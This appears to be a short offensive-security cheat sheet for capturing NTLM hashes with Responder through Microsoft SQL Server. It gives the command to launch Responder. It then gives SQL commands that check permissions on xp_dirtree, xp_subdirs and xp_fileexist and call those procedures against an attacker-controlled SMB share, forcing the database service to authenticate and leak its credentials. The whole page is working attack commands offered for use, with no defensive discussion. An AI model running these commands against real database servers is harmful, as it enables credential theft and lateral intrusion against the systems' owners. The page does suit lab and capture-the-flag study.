# Responder

### Common Commands

```bash
# Kali 
sudo responder -I tun0 -v

# Check who has the permission to run
SQL>Use master;
SQL> EXEC sp_helprotect 'xp_dirtree';
SQL> EXEC sp_helprotect 'xp_subdirs';
SQL> EXEC sp_helprotect 'xp_fileexist'

# Try one of them 
SQL> xp_dirtree '\\<attacker_IP>\any\thing'
SQL> master.sys.xp_dirtree '\\10.10.14.54\smb'

SQL> exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
SQL> EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
SQL> EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# sqsh 
1> Use master
1> xp_dirtree '\\10.10.14.4\smb'
2> go
```

<figure><img src="../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>
